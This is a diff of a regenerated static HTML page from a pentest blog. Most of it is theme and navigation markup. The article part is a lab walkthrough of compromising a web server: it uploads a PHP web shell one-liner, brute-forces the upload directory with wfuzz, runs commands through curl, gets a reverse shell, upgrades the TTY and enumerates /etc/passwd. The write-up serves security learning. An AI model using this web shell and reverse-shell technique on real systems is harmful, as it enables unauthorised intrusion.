@@ -7,12 +7,17 @@
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
       
-      
         <meta name="author" content="['@kf0k']">
       
       
+      
+        <link rel="prev" href="../basic_av_evasion/">
+      
+      
+        <link rel="next" href="../../Writeups/">
+      
       <link rel="icon" href="../../assets/logo.png">
-      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-7.3.4">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.10">
     
     
       
@@ -20,32 +25,30 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.db9e7362.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.0d440cfe.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.3f5d1f46.min.css">
-        
-          
-          
-          <meta name="theme-color" content="#000000">
-        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.2505c338.min.css">
       
+      
+
     
     
     
       
+        
         
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,400i,700%7CSource+Code+Pro&display=fallback">
-        <style>:root{--md-text-font-family:"Ubuntu";--md-code-font-family:"Source Code Pro"}</style>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CSource+Code+Pro:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Source Code Pro"}</style>
       
     
     
-    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
-
+    
     
     
   </head>
@@ -59,7 +62,6 @@
     <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="">
   
     
-    <script>function __prefix(e){return new URL("../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
@@ -76,6 +78,7 @@
       
     </div>
     
+    
       
 
 <header class="md-header" data-md-component="header">
@@ -86,7 +89,7 @@
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
     </label>
     <div class="md-header__title" data-md-component="header-title">
       <div class="md-header__ellipsis">
@@ -108,22 +111,21 @@
     
     
       <label class="md-header__button md-icon" for="__search">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
       </label>
-      
-<div class="md-search" data-md-component="search" role="dialog">
+      <div class="md-search" data-md-component="search" role="dialog">
   <label class="md-search__overlay" for="__search"></label>
   <div class="md-search__inner" role="search">
     <form class="md-search__form" name="search">
       <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
       <label class="md-search__icon md-icon" for="__search">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
       </label>
       <nav class="md-search__options" aria-label="Search">
         
-        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
         </button>
       </nav>
       
@@ -134,7 +136,7 @@
           <div class="md-search-result__meta">
             Initializing search
           </div>
-          <ol class="md-search-result__list"></ol>
+          <ol class="md-search-result__list" role="presentation"></ol>
         </div>
       </div>
     </div>
@@ -275,17 +277,18 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
       
       
       
-      
-        <label class="md-nav__link" for="__nav_2">
+        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
           AD
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="AD" data-md-level="1">
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
         <label class="md-nav__title" for="__nav_2">
           <span class="md-nav__icon md-icon"></span>
           AD
@@ -325,17 +328,18 @@
     <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
       
       
       
-      
-        <label class="md-nav__link" for="__nav_3">
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
           Posts
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="Posts" data-md-level="1">
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
         <label class="md-nav__title" for="__nav_3">
           <span class="md-nav__icon md-icon"></span>
           Posts
@@ -365,7 +369,7 @@
   
     <li class="md-nav__item md-nav__item--active">
       
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
       
         
@@ -381,6 +385,7 @@
       </a>
       
         
+
 <nav class="md-nav md-nav--secondary" aria-label="Table of contents">
   
   
@@ -576,17 +581,18 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
       
       
       
-      
-        <label class="md-nav__link" for="__nav_4">
+        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
           Writeups
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="Writeups" data-md-level="1">
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
         <label class="md-nav__title" for="__nav_4">
           <span class="md-nav__icon md-icon"></span>
           Writeups
@@ -616,17 +622,18 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" type="checkbox" id="__nav_4_2" >
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
       
       
       
-      
-        <label class="md-nav__link" for="__nav_4_2">
+        <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
           Machines
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="Machines" data-md-level="2">
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
         <label class="md-nav__title" for="__nav_4_2">
           <span class="md-nav__icon md-icon"></span>
           Machines
@@ -642,17 +649,18 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_1" type="checkbox" id="__nav_4_2_1" >
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_1" >
       
       
       
-      
-        <label class="md-nav__link" for="__nav_4_2_1">
+        <label class="md-nav__link" for="__nav_4_2_1" id="__nav_4_2_1_label" tabindex="0">
           Active
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="Active" data-md-level="3">
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_1_label" aria-expanded="false">
         <label class="md-nav__title" for="__nav_4_2_1">
           <span class="md-nav__icon md-icon"></span>
           Active
@@ -689,17 +697,18 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_2" type="checkbox" id="__nav_4_2_2" >
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2" >
       
       
       
-      
-        <label class="md-nav__link" for="__nav_4_2_2">
+        <label class="md-nav__link" for="__nav_4_2_2" id="__nav_4_2_2_label" tabindex="0">
           Bastian
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="Bastian" data-md-level="3">
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_2_label" aria-expanded="false">
         <label class="md-nav__title" for="__nav_4_2_2">
           <span class="md-nav__icon md-icon"></span>
           Bastian
@@ -736,18 +745,67 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_3" type="checkbox" id="__nav_4_2_3" >
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_2_3" id="__nav_4_2_3_label" tabindex="0">
+          Flight
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          Flight
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Writeups/machines/flight/writeup/" class="md-nav__link">
+        HacktheBox Flight
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
       
       
       
       
-        <label class="md-nav__link" for="__nav_4_2_3">
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_2_4" id="__nav_4_2_4_label" tabindex="0">
           Intelligence
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="Intelligence" data-md-level="3">
-        <label class="md-nav__title" for="__nav_4_2_3">
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4_2_4">
           <span class="md-nav__icon md-icon"></span>
           Intelligence
         </label>
@@ -783,18 +841,19 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_4" type="checkbox" id="__nav_4_2_4" >
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_5" >
       
       
       
-      
-        <label class="md-nav__link" for="__nav_4_2_4">
+        <label class="md-nav__link" for="__nav_4_2_5" id="__nav_4_2_5_label" tabindex="0">
           Knife
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="Knife" data-md-level="3">
-        <label class="md-nav__title" for="__nav_4_2_4">
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4_2_5">
           <span class="md-nav__icon md-icon"></span>
           Knife
         </label>
@@ -830,18 +889,19 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_5" type="checkbox" id="__nav_4_2_5" >
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_6" >
       
       
       
-      
-        <label class="md-nav__link" for="__nav_4_2_5">
+        <label class="md-nav__link" for="__nav_4_2_6" id="__nav_4_2_6_label" tabindex="0">
           Love
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="Love" data-md-level="3">
-        <label class="md-nav__title" for="__nav_4_2_5">
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4_2_6">
           <span class="md-nav__icon md-icon"></span>
           Love
         </label>
@@ -877,18 +937,19 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_6" type="checkbox" id="__nav_4_2_6" >
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_7" >
       
       
       
-      
-        <label class="md-nav__link" for="__nav_4_2_6">
+        <label class="md-nav__link" for="__nav_4_2_7" id="__nav_4_2_7_label" tabindex="0">
           Monitors
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="Monitors" data-md-level="3">
-        <label class="md-nav__title" for="__nav_4_2_6">
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_7_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4_2_7">
           <span class="md-nav__icon md-icon"></span>
           Monitors
         </label>
@@ -924,18 +985,19 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_7" type="checkbox" id="__nav_4_2_7" >
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_8" >
       
       
       
-      
-        <label class="md-nav__link" for="__nav_4_2_7">
+        <label class="md-nav__link" for="__nav_4_2_8" id="__nav_4_2_8_label" tabindex="0">
           Scrambled
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="Scrambled" data-md-level="3">
-        <label class="md-nav__title" for="__nav_4_2_7">
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_8_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4_2_8">
           <span class="md-nav__icon md-icon"></span>
           Scrambled
         </label>
@@ -971,18 +1033,19 @@
     <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_8" type="checkbox" id="__nav_4_2_8" >
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_9" >
       
       
       
-      
-        <label class="md-nav__link" for="__nav_4_2_8">
+        <label class="md-nav__link" for="__nav_4_2_9" id="__nav_4_2_9_label" tabindex="0">
           Shoker
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" aria-label="Shoker" data-md-level="3">
-        <label class="md-nav__title" for="__nav_4_2_8">
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_9_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4_2_9">
           <span class="md-nav__icon md-icon"></span>
           Shoker
         </label>
@@ -1034,6 +1097,7 @@
                 <div class="md-sidebar__scrollwrap">
                   <div class="md-sidebar__inner">
                     
+
 <nav class="md-nav md-nav--secondary" aria-label="Table of contents">
   
   
@@ -1211,12 +1275,15 @@
               </div>
             
           
-          <div class="md-content" data-md-component="content">
-            <article class="md-content__inner md-typeset">
-              
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
                 
-                
-                <h1 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h1>
+                  
+
+
+
+<h1 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h1>
 <p><img alt="" src="../osint_into_da.assets/mylab-diag.png" /></p>
 <blockquote>
 <p>I’ve had several customers come to me before a pentest and say they  think they’re in a good shape because their vulnerability scan shows no  critical vulnerabilities and that they’re ready for a pentest, which  then leads me to getting domain administrator in fifteen minutes by just exploiting misconfigurations in AD. <a href="https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/">HAUSEC</a></p>
@@ -1263,65 +1330,65 @@ This blog will demonstrate an attack scenario of advisory compromise the domain 
 <h2 id="web01">Web01<a class="headerlink" href="#web01" title="Permanent link">&para;</a></h2>
 <h3 id="initial-access">Initial Access<a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h3>
 <p>Let's try to abuse this function by uploading simple PHP file that grant us to execute commands. This can be done using the following one-liner command:  </p>
-<div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;&#39;</span> &gt; cmd.php
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>cmd.php
 </code></pre></div>
 <p><img alt="" src="../osint_into_da.assets/image-20211223114917040.png" /></p>
 <p>By uploading the PHP file, the website will response with the following:</p>
 <p><img alt="image-20211223115256972" src="../osint_into_da.assets/image-20211223115256972.png" /></p>
 <p>The PHP file have been uploaded, however, we don't know where it is uploaded. We will need to brute force the directories to find the directory that the file have been uploaded into. We can use here <code>wfuzz</code> to brute force the directory that contains the PHP file <code>cmd.php</code> </p>
-<div class="highlight"><pre><span></span><code>wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt  --hc <span class="m">404</span> http://192.168.241.204/FUZZ/cmd.php
+<div class="highlight"><pre><span></span><code>wfuzz<span class="w"> </span>-c<span class="w"> </span>-z<span class="w"> </span>file,/usr/share/wordlists/dirb/common.txt<span class="w">  </span>--hc<span class="w"> </span><span class="m">404</span><span class="w"> </span>http://192.168.241.204/FUZZ/cmd.php
 </code></pre></div>
 <p>The result of this command will be: </p>
-<div class="highlight"><pre><span></span><code>Target: http://192.168.241.204/FUZZ/cmd.php
-Total requests: <span class="nv">4614</span>
+<div class="highlight"><pre><span></span><code>Target:<span class="w"> </span>http://192.168.241.204/FUZZ/cmd.php
+Total<span class="w"> </span>requests:<span class="w"> </span><span class="nv">4614</span>
 <span class="o">=====================================================================</span>
-ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>
+ID<span class="w">           </span>Response<span class="w">   </span>Lines<span class="w">    </span>Word<span class="w">       </span>Chars<span class="w">       </span><span class="nv">Payload</span>
 <span class="o">=====================================================================</span>
-<span class="m">000004216</span>:   <span class="m">500</span>        <span class="m">0</span> L      <span class="m">0</span> W        <span class="m">0</span> Ch        <span class="s2">&quot;uploads&quot;</span>  
+<span class="m">000004216</span>:<span class="w">   </span><span class="m">500</span><span class="w">        </span><span class="m">0</span><span class="w"> </span>L<span class="w">      </span><span class="m">0</span><span class="w"> </span>W<span class="w">        </span><span class="m">0</span><span class="w"> </span>Ch<span class="w">        </span><span class="s2">&quot;uploads&quot;</span><span class="w">  </span>
 </code></pre></div>
 <p>So we found the directory <code>uploads</code>, now we can browse into that directory but we will use <code>curl</code> instead to make HTTP GET request. </p>
-<div class="highlight"><pre><span></span><code>curl <span class="s1">&#39;http://192.168.241.204/uploads/cmd.php?cmd=id&#39;</span> 
-<span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span><span class="s1">&#39;http://192.168.241.204/uploads/cmd.php?cmd=id&#39;</span><span class="w"> </span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
 </code></pre></div>
 <p>We have now command execution in the server with the user <code>www-data</code>. To obtain reverse shell, we will upload <code>shell.php</code> which can found from the directory <code>/usr/share/laudanum/php/</code>. After upload it, setup <code>netcat</code> listener and browse into the uploaded PHP file. </p>
 <p><img alt="" src="../osint_into_da.assets/image-20211223122635646.png" /></p>
 <p>Now we obtained reverse shell on <strong>Web01</strong> host. Before enumerating the machine, first we will upgrade our shell to fully interactive shell using the following commands: </p>
-<div class="highlight"><pre><span></span><code>$ which python3
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>which<span class="w"> </span>python3
 /usr/bin/python3
-$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
-www-data@web01:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-www-data@web01:/$ ^Z <span class="c1"># &lt;-- CRTL + Z</span>
+$<span class="w"> </span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+www-data@web01:/$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@web01:/$<span class="w"> </span>^Z<span class="w"> </span><span class="c1"># &lt;-- CRTL + Z</span>
 
-stty raw -echo<span class="p">;</span> <span class="nb">fg</span> <span class="c1"># &lt;-- in local machine</span>
+stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span><span class="w"> </span><span class="c1"># &lt;-- in local machine</span>
 
-www-data@web01:/$ 
+www-data@web01:/$<span class="w"> </span>
 </code></pre></div>
 <h3 id="pivoting-to-dev01">Pivoting to dev01<a class="headerlink" href="#pivoting-to-dev01" title="Permanent link">&para;</a></h3>
 <p>First, let's enumerate the users in this box: </p>
-<div class="highlight"><pre><span></span><code>www-data@web01:~/html$ cat /etc/passwd <span class="p">|</span> grep -i <span class="s2">&quot;/bin/bash&quot;</span>
+<div class="highlight"><pre><span></span><code>www-data@web01:~/html$<span class="w"> </span>cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;/bin/bash&quot;</span>
 root:x:0:0:root:/root:/bin/bash
 dev01:x:1001:1001:devloper,devloper,,:/home/dev01:/bin/bash
 </code></pre></div>
 <p>From the above command output, we identified that there are two users <code>root</code> and <code>dev01</code>. Next, let's enumerate website files. </p>
-<div class="highlight"><pre><span></span><code>www-data@web01:~/html$ ls -la 
-total <span class="m">104</span>
-drwxr-xr-x <span class="m">8</span> www-data www-data  <span class="m">4096</span> Dec <span class="m">18</span> <span class="m">09</span>:59 .
-drwxr-xr-x <span class="m">4</span> dev01 dev01  <span class="m">4096</span> Dec <span class="m">17</span> <span class="m">23</span>:52 ..
-drwxr-xr-x <span class="m">2</span> www-data www-data  <span class="m">4096</span> Dec <span class="m">17</span> <span class="m">23</span>:52 Admin
--rw-r--r-- <span class="m">1</span> www-data www-data   <span class="m">127</span> Dec <span class="m">18</span> <span class="m">09</span>:59 config.php
-drwxr-xr-x <span class="m">2</span> www-data www-data  <span class="m">4096</span> Dec <span class="m">17</span> <span class="m">23</span>:52 css
-drwxr-xr-x <span class="m">2</span> www-data www-data  <span class="m">4096</span> Dec <span class="m">17</span> <span class="m">23</span>:52 fonts
-drwxr-xr-x <span class="m">4</span> www-data www-data  <span class="m">4096</span> Dec <span class="m">17</span> <span class="m">23</span>:52 images
--rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">55106</span> Dec <span class="m">18</span> <span class="m">09</span>:52 index.html
--rw-r--r-- <span class="m">1</span> www-data www-data   <span class="m">612</span> Dec <span class="m">18</span> <span class="m">09</span>:04 index.nginx-debian.html
-drwxr-xr-x <span class="m">2</span> www-data www-data  <span class="m">4096</span> Dec <span class="m">17</span> <span class="m">23</span>:52 js
-drwxr-xr-x <span class="m">2</span> www-data www-data  <span class="m">4096</span> Dec <span class="m">17</span> <span class="m">23</span>:52 php
--rw-r--r-- <span class="m">1</span> www-data www-data   <span class="m">550</span> Dec <span class="m">18</span> <span class="m">09</span>:53 upload.php
-drwxr-xr-x <span class="m">2</span> www-data www-data  <span class="m">4096</span> Dec <span class="m">23</span> <span class="m">21</span>:15 uploads
+<div class="highlight"><pre><span></span><code>www-data@web01:~/html$<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>
+total<span class="w"> </span><span class="m">104</span>
+drwxr-xr-x<span class="w"> </span><span class="m">8</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:59<span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">4</span><span class="w"> </span>dev01<span class="w"> </span>dev01<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>..
+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>Admin
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">   </span><span class="m">127</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:59<span class="w"> </span>config.php
+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>css
+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>fonts
+drwxr-xr-x<span class="w"> </span><span class="m">4</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>images
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w"> </span><span class="m">55106</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:52<span class="w"> </span>index.html
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">   </span><span class="m">612</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:04<span class="w"> </span>index.nginx-debian.html
